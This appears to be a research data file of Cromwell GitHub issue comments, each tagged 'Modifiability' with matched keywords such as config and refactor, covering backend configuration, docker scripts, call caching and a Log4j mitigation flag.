Modifiability,Cromwell may be vulnerable in certain configurations. This is being looked into. We recommend the immediate remedy of disabling the vulerable feature of Log4j:; ```; ‐Dlog4j2.formatMsgNoLookups=True; ```; [Source.](https://logging.apache.org/log4j/2.x/),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211:38,config,configurations,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-992699211,1,['config'],['configurations']
Modifiability,"Cromwell may submit more jobs to the Pipelines API than is able to run at one time, so they're held in a queue by Google Cloud. As jobs finish, the next job is run. There are a few ways to terminate a workflow (see the [Abort guide](https://cromwell.readthedocs.io/en/stable/execution/ExecutionTwists/#abort) for more information). But essentially you need Cromwell to gracefully shut down the workflow:. - In `run` mode, you can issue [SIGINT or SIGTERM](https://cromwell.readthedocs.io/en/stable/Configuring/#abort) which asks Cromwell to issue the abort requests to GCP,; - In `server` mode, you can issue an `abort` through a POST request. By running `scancel`, you may not give Cromwell sufficient time to perform this graceful shutdown process, and hence your jobs held in the GCP Pipelines queue will still execute.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898:498,Config,Configuring,498,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898,1,['Config'],['Configuring']
Modifiability,"Cromwell uses https://github.com/lightbend/config so if you can find support for that in the library, we can consider it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1490324960:43,config,config,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1490324960,1,['config'],['config']
Modifiability,"Curious about the ""should be in the WDL spec too"" part. IMO this would be most obviously a Cromwell config file option",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-268774441:100,config,config,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-268774441,1,['config'],['config']
Modifiability,Curious why ficus over configs (or something else),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252407502:23,config,configs,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1554#issuecomment-252407502,1,['config'],['configs']
Modifiability,"Current proposal is to support the [`disks` runtime attribute](http://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#disks) using the following rules:. 1. For all tasks, provide a predictable bind mount for `local-disk`. Specifications for disk size and disk type will be ignored, as they are not needed or configurable at runtime for AWS Batch. ; 2. Other mount points that are defined (e.g. `disks: ""/mnt/my_mnt 3 SSD, /mnt/my_mnt2 500 HDD""`) will result in additional bind mounts from the host container to the running docker container for the task. The disk size and disk type are ignored. The AWS Batch reference deployment for Cromwell will provide a mount point for each task which the `disks` will be structured under. As an example, assume the following runtime attribute definition:. ```; runtime {; disks: ""local-disk 100 SSD, /mnt/my_mnt 3 SSD, /mnt/my_mnt2 500 HDD""; }; ```. Will result in a filesystem tree structure on the host:. ```; /mnt/cromwell_io_mountpoint/; ├── $CROMWELL_TASK_ID; ├── /cromwell_root; └── /mnt/; ├── /my_mnt; └── /my_mnt2; ```. And the running container will see the `/cromwell_root`, `/mnt/my_mnt` and `/mnt/my_mnt2` directories.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-398854923:314,config,configurable,314,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-398854923,1,['config'],['configurable']
Modifiability,"Currently biscayne in WDL and application.conf is equal to draft-2, maybe you can at least base it on version 1.0 and then extend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453077307:123,extend,extend,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453077307,1,['extend'],['extend']
Modifiability,"Currently default runtime attributes are typechecked in the backend-specific runtime attribute classes (e.g. `JesRuntimeAttributes`, `LocalRuntimeAttributes`, etc) using attribute name to type mappings that are backend-specific. With our current static backend selection scheme, MWDA knows the backend to which a task will be sent at validation time. So while it's currently possible to refactor to expose backend-specific default runtime attribute typechecking to MWDA, that system would break down with a dynamic backend selection scheme. . It's also not clear how MWDA-composed runtime attributes would be handed to the backend-specific runtime attribute classes for the more substantive ""beyond typechecking"" round of validation and execution. It's possible we could copy the `NamespaceWithWorkflow` and write the relevant attributes into the tasks, but I'm not sure if we'd get into trouble later with bindings that no longer agree with the AST.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-231157891:387,refactor,refactor,387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-231157891,1,['refactor'],['refactor']
Modifiability,"D file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$rece",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4169,Config,ConfigInitializationActor,4169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"Debrief here from a face-to-face w/ @geoffjentry :. So the config flag should be set _AND_ the call should be using docker to do the override. To be clear, the truth table here is . Using Docker on this call | Configuration Flag is set to true | Should reassign; --|--|--; T|T|T; T|F|F; F|T|F; F|F|F. Config flag should be `docker.override_umask_when_creating_directories`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-376196463:59,config,config,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-376196463,3,"['Config', 'config']","['Config', 'Configuration', 'config']"
Modifiability,"Deleted a few comments as I misread what @cola Warner said. Sorry I’m leaving that autocorrect typo as it’s awesome. We should discuss what this does and does not do. I viewed the request to be an enhancement on current behavior, so should ensure that’s the case",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3490#issuecomment-379276342:197,enhance,enhancement,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3490#issuecomment-379276342,1,['enhance'],['enhancement']
Modifiability,Deregistering a job definition is probably not recommended since it will likely have similar constraints as the current method of creating a job def for each task call. Reducing the number of job definitions that need to be created would be better long term. That would require changing how task specific paths on the host instance are created - e.g. using a combination of job environment variables and additional commands to container overrides.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-505995959:390,variab,variables,390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-505995959,1,['variab'],['variables']
Modifiability,"Developer notes:. When first launching single workflow mode, Cromwell calls `cromwell.CommandLineArguments#validateSubmission` and generates a `cromwell.CommandLineArguments.ValidSubmission` if the submission looks good. `ValidSubmission` has the appearance of supporting directories because it has the member `dependencies`. In [both](https://github.com/broadinstitute/cromwell/blob/9249537fd094c6979b0c64e99fcc90d48c861487/server/src/main/scala/cromwell/CromwellEntryPoint.scala#L229) [places](https://github.com/broadinstitute/cromwell/blob/9249537fd094c6979b0c64e99fcc90d48c861487/server/src/main/scala/cromwell/CromwellEntryPoint.scala#L249) where `validateSubmission` is actually called, however, we copy the value into another variable that is named & treated as the path to a zip file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5693#issuecomment-672004178:734,variab,variable,734,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5693#issuecomment-672004178,1,['variab'],['variable']
Modifiability,"Did anyone ever figure out why Cromwell would fail with an `EntityStreamSizeException`? When and how was this issue with the CI fixed?. I managed to make a similar `EntityStreamSizeException` happen using Cromwell release 66 in `run` mode, without providing a configuration, with a workflow input that specified HTTPS URLs for large files as file inputs. Is this exception ever supposed to happen? And, if so, when and why?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4298#issuecomment-892074494:260,config,configuration,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4298#issuecomment-892074494,1,['config'],['configuration']
Modifiability,Did you try to implement your own docker-submit in the config file?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-699969603:55,config,config,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-699969603,1,['config'],['config']
Modifiability,"Dilation failed, as the affected tests seemed to ignore the default config. I ~~hacked~~ put a bandaid solution in for now and left `PBE` notes todo later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/902#issuecomment-222046685:68,config,config,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/902#issuecomment-222046685,1,['config'],['config']
Modifiability,"Disagree, the point of a wdl is to provide the same result. This could radically alter a result of it were configurable, and that's exactly the reason it is specified in cwl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-268785327:107,config,configurable,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-268785327,1,['config'],['configurable']
Modifiability,"Discussed in person, a better way could be to do this work as a separate graph node. It would make the wiring a bit more complicated and the immediate gain isn't clear so I'll leave as is for now and we can revisit later when we refactor everything to finally achieve Cromwell singularity.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3443#issuecomment-375080865:229,refactor,refactor,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3443#issuecomment-375080865,1,['refactor'],['refactor']
Modifiability,Do you have a docker hub private token in your config ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1924#issuecomment-275759774:47,config,config,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1924#issuecomment-275759774,1,['config'],['config']
Modifiability,Does it matter what config library cromwell uses? Isn't this just. ```; for line in config:; if line not in expected_lines:; raise Warning; ```; and the trick is just deciding what your set of expected lines is?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1492729378:20,config,config,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7109#issuecomment-1492729378,2,['config'],['config']
Modifiability,Does this mean refactoring Final Calls to run on a backend instead of in the engine ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/579#issuecomment-197909145:15,refactor,refactoring,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/579#issuecomment-197909145,1,['refactor'],['refactoring']
Modifiability,"Er, yes that was in a fork that I appear to have deleted... :flushed: although it wouldn't be useful as-is (was?) anymore because it was from back in the day when all the different sharedfilesystem backends were implemented in code, not defined in configuration as they are now. Last comment of @kshakir [above](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929) summarizes the situation perfectly for a within-cromwell solution. If I were going to work around this now I would `cron` up a simple script that:. 1. Makes API call to query the cromwell service for running jobs; 2. Finds all the corresponding `stdout.submit` files in the cromwell job task call execution directories to get scheduler job ids for the cromwell job; 3. Asks the scheduler for the alive-or-dead status of those scheduler job ids and if not alive, aborts the cromwell job via API call",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-360318578:248,config,configuration,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-360318578,1,['config'],['configuration']
Modifiability,FWIW that parser is a 3rd party library (https://github.com/lightbend/config),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549#issuecomment-464246825:70,config,config,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549#issuecomment-464246825,1,['config'],['config']
Modifiability,"FYI: Places we allow expressions:. | Position | Notes |; | --- | --- |; | Workflow declarations | Inject a task with matching dependencies. Use ""Local"" backend... But what if Local is not configured (e.g. FC) |; | Task declarations | Use the same backend. Inject a preceeding task (maybe evaluate everything at once?) |; | Task outputs | Use the same backend We'd need to insert a new task afterwards and rewire following tasks. We'd also need to back-fill results once they're known |; | Subexpressions | In the same context as the main expression |; | Scatter signatures | Actually this one doesn't work right now (sad!) but we could probably treat them just like workflow declarations |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1618#issuecomment-256066377:188,config,configured,188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1618#issuecomment-256066377,1,['config'],['configured']
Modifiability,FileSystems (and their config) are now backend specific and the local backend can be disabled. I think this one can be closed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/821#issuecomment-254295981:23,config,config,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/821#issuecomment-254295981,1,['config'],['config']
Modifiability,"Finally I figure out one solution, but it is a little bit ugly and still look for an elegant way:. - Global variables WDL as below:. ```; workflow global {; }. task init {; command { }; output {; String version = ""v1.0""; String reference = ""hg19"". }; }; ```. - Pipeline WDL as below:; ```; import ""global.wdl"" as global. workflow pipeline {; # Global variables; call global.init; String version = init.version; String reference = init.reference; # Pipeline variables; String sample_id = ""Sample_001""; call snp { input: version = version, reference = reference, sample_id = sample_id }; }. task snp {; String version; String reference; String sample_id; command { echo ""SNP_${version} for ${sample_id} on ${reference}!"" }. output { String out = read_string(stdout()) }; }. ```; The final result is:; ```; [2018-11-21 18:23:14,32] [info] BackgroundConfigAsyncJobExecutionActor [a225847apipeline.snp:NA:1]: echo ""SNP_v1.0 for Sample_001 on hg19!""; ```. And you can see global variables are passed to the pipeline WDL while there are some workaround such as empty global workflow and helper task of init.; Is there any other solution?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4416#issuecomment-440767243:108,variab,variables,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4416#issuecomment-440767243,4,['variab'],['variables']
Modifiability,"Finally, I found out why the MD5 value contains the file path. I Hope it can help others:. ### The server config:; `check-sibling-md5 : true`; When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash.; So i checked the metadata, i found all of hash with file path records is connecting with md5 task, the task command :; ```; command <<<; md5sum ~{inputfile} > ~{inputfile.md5}; >>>; ```; : ( that is a stupid mistakes, right? ; 1. The `inputfile` is a file with whole path, so the md5 task will generate a hash with path like ""b882eaf8272a52d3eea851d74a6b4aec /path/sample.final.bam"", and write to the file `inputfile.md5`. ; 2. The cromwell server will find the `inputfile` sbling md5 with the name `inputfile.md5`, which contains hash with path. So the callcaching in metadata records it.; 3. The next workflow will not hit cache because the file path are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592:106,config,config,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-826572592,1,['config'],['config']
Modifiability,"Fixed in #1252. ""walltime"" may now read as a backend specific runtime attribute just like any other. I've called the runtime attribute ""sge_walltime"" below. ```; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {. runtime-attributes = """"""; Int cpu = 1; Float? memory_gb; String? sge_queue; String? sge_project; String? sge_walltime; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out} \; -e ${err} \; -pe smp ${cpu} \; ${""-l m_mem_free="" + memory_gb + ""gb""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${""-l h rt="" + sge_walltime } \; ${script}; """""". kill = ""qdel ${job_id}"". check-alive = ""qstat -j ${job_id}"". job-id-regex = ""(\\d+)"". }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-242567862:212,config,config,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-242567862,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"Followed up with @ruchim via email and we poked around the codebase this afternoon and think we have a good idea on how to add this functionality. First though we wanted to run the general plan by you guys and had a couple of questions. . It seems like the place to staple this in would be as an additional `Action` in `GenomicsFactory` (as was alluded to above). We weren't sure if it made sense to staple it in as an additional `monitoringAction` or `userAction` as they are both handled slightly differently than this would be. Neither fits perfectly, but it seems like it could potentially be made to work in either place. . Another alternative (maybe the cleanest one?) would be to just introduce a `remoteAccessAction` or similar helper that builds up an action just for this purpose. We wouldn't want to change the default behavior and/or have this `ssh` server always running, so it seems to make sense to make it configurable. We figured the PAPI section of the conf file would be a reasonable place to add this new option. Does that generally sound in line with how you guys would approach this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4966#issuecomment-494561050:922,config,configurable,922,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4966#issuecomment-494561050,1,['config'],['configurable']
Modifiability,"For Singularity it'd be super helpful to post it here just so that the information is in one place. Also, it'll serve a dual purpose of letting me ~procrastinate~ let this mature a bit more as well as give me a good ~kick in the backside~ reminder to finish this off once it's done. For udocker IIRC we don't have explicit docs like this but there definitely **are** configs floating around which have worked for most, but not all, people. If my statement is correct and you haven't dug one up let me know and I can send one to you, we can go from there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454248194:367,config,configs,367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454248194,1,['config'],['configs']
Modifiability,"For further clarification. There are two `exec` statements in the config. The `exec` statement **before** the submit command will execute a simple echo command. If singularity notices the image is not there it will pull it to `SINGULARITY_CACHEDIR`. ; Then the job is submitted and the `exec` statement **in** the submit command is executed. If `SINGULARITY_CACHEDIR` is on a shared filesystem the image will already be present. The image will *not* be pulled by the execution node and the job executes right away. Using `exec` instead of `pull` means that Singularity will decide where the image goes, and not the user. This is quite useful as Singularity has all the functionality to make a functional image cache already built-in. This way we don't have to hack it together in bash, which is always the less preferable option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630879541:66,config,config,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630879541,1,['config'],['config']
Modifiability,"For now 👍 assuming you switch the file extension. ToL: This code may need some refactoring love (some functionality could be in the base SFS backend, some should migrate to the Config backend). I'm fine leaving it until somehow we need to touch it. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1520/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1520#issuecomment-252114005:79,refactor,refactoring,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1520#issuecomment-252114005,2,"['Config', 'refactor']","['Config', 'refactoring']"
Modifiability,"For people who also spent some time with this there is also an option to do this on a per workflow basis:; 1. Put it in a options.json:; ```json; {; ""default_runtime_attributes"": {; ""docker_user"": ""$EUID""; }; }; ```; 2. Do it on the command line: `java -Dbackend.providers.Local.config.runtime-attributes='String? docker String? docker_user=""$EUID""' -jar <cromwell_jar> run mypipeline.wdl`. @geoffjentry Do you have some preference where we should put this in the documentation? Or not, of course. I posted it here so people searching for a solution would find it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2658#issuecomment-490503768:279,config,config,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2658#issuecomment-490503768,1,['config'],['config']
Modifiability,"For testing purposes - I was running this as a local server using the following auths; ```; auths = [{; name = ""patto""; scheme = ""assume_role""; base-auth = ""pattocreds""; role-arn = ""arn:aws:iam::XXXXXXXXXXXX:role/OrganizationAccountAccessRole""; }, ; {; name = ""pattocreds""; scheme = ""default"". }]. .. AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; auth = ""patto""; filesystems { s3 { auth = ""patto"" } }; ...; }. ```; Submitting jobs to this local server would work for an hour - and then start failing on all AWS calls - in particular the status calls in OccasionalStatusPollingActor. The default credential expiry for an assume-role is 3600 seconds. With the changes in this PR - the local server in assume-role mode has lasted for more than an hour.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5229#issuecomment-542979621:395,config,config,395,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5229#issuecomment-542979621,1,['config'],['config']
Modifiability,"For the reviewer, there are two things happening in this PR: ; 1.) There is a new Centaur test that tests reading/writing from Azure Blob Storage; 2.) There is some new plumbing that allows ^^ to use a specialized Azure Config while running in CI",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062:220,Config,Config,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7024#issuecomment-1470726062,1,['Config'],['Config']
Modifiability,"For those coming across this issue, there is already an ""alternative"" `disable`. Add this to your config file and the ""Local"" backend will be disabled. . ```hocon; backend.providers.Local.config.root: /dev/null; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-423236846:98,config,config,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-423236846,2,['config'],['config']
Modifiability,"For those that come across this PR in the future, a subset of the [docs](https://docs.codecov.io/v4.3.6/docs) referred to in this PR:; - Commit Status; - Project Status; - [Target](https://docs.codecov.io/v4.3.6/docs/commit-status#section-target); - [Threshold](https://docs.codecov.io/v4.3.6/docs/commit-status#section-threshold); - [Base](https://docs.codecov.io/v4.3.6/docs/commit-status#section-base); - [Patch Status](https://docs.codecov.io/v4.3.6/docs/commit-status#section-patch-status); - Coverage Configuration; - [Range](https://docs.codecov.io/v4.3.6/docs/coverage-configuration#section-range); - [Rounding](https://docs.codecov.io/v4.3.6/docs/coverage-configuration#section-rounding); - Notifications; - [Slack](https://docs.codecov.io/v4.3.6/docs/notifications#section-slack); - Pull Request Comments; - [Disable comment](https://docs.codecov.io/v4.3.6/docs/pull-request-comments#section-disable-comment) (aka Github emails); - CodeCov YAML; - [Default Branch](https://docs.codecov.io/v4.3.6/docs/codecov-yaml#section-default-branch); - [Validate your repository yaml](https://docs.codecov.io/v4.3.6/docs/codecov-yaml#section-validate-your-repository-yaml)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2779#issuecomment-339091206:507,Config,Configuration,507,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2779#issuecomment-339091206,3,"['Config', 'config']","['Configuration', 'configuration']"
Modifiability,"For what it's worth, I'm going to plug the WDL plugin for intellij as the way forwards here. If you put this file in you get this:; <img width=""501"" alt=""screen shot 2017-11-14 at 1 23 45 pm"" src=""https://user-images.githubusercontent.com/13006282/32797253-2615f550-c93f-11e7-9bda-deb830959ef5.png"">. I think highlights the points given in the explanation above that:; - The `#` is being interpreted as part of the WDL command; - The `}` is now closing the command block; - The lines below that are now not being parsed properly. And in addition, it does all this as you type!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2870#issuecomment-344351988:47,plugin,plugin,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2870#issuecomment-344351988,1,['plugin'],['plugin']
Modifiability,ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.reflect.InvocationTargetException; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); at java.lang.reflect.Constructor.newInstance(Constructor.java:423); at akka.util.Reflect$.instantiate(Reflect.scala:65); at akka.actor.ArgsReflectConstructor.produce(IndirectActorProducer.scala:96); at akka.actor.Props.newActor(Props.scala:213); at akka.actor.ActorCell.newActor(ActorCell.scala:562); at akka.actor.ActorCell.create(ActorCell.scala:588); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); ... 8 more; Caused by: java.lang.ExceptionInInitializerError; at cromwell.services.SingletonServicesStore$class.$init$(ServicesStore.scala:28); at cromwell.services.keyvalue.impl.SqlKeyValueServiceActor.<init>(SqlKeyValueServiceActor.scala:16); ... 18 more; Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'main'; at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:152); at com.typesafe.config.impl.SimpleConfig.findKey(SimpleConfig.java:145); at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:172); at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:184); at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:189); at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:258); at com.typesafe.config.impl.SimpleConfig.getConfig(SimpleConfig.java:264); at com.typesafe.config.impl.SimpleConfig.getConfig(SimpleConfig.java:37); at cromwell.services.SingletonServicesStore$.<init>(ServicesStore.scala:43); at cromwell.services.SingletonServicesStore$.<clinit>(ServicesStore.scala); ... 20 more. ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974:2513,config,config,2513,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1748#issuecomment-265155974,11,"['Config', 'config']","['ConfigException', 'config', 'configuration']"
Modifiability,"From a technical perspective - sure likely possible. My question is what do you want requests to that URL to return? 400,404, 50X? . The biggest challenge is how to make the change such that it does not break everything else, the current proxy setup is pretty simple ( / (slash - which is where /engine falls under) does one thing, /api does another). This will require adding a 3rd option around /engine/v1/stats - likely something with mod_rewrite. Will take me a bit to work through a workable config",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3713#issuecomment-395755673:497,config,config,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3713#issuecomment-395755673,1,['config'],['config']
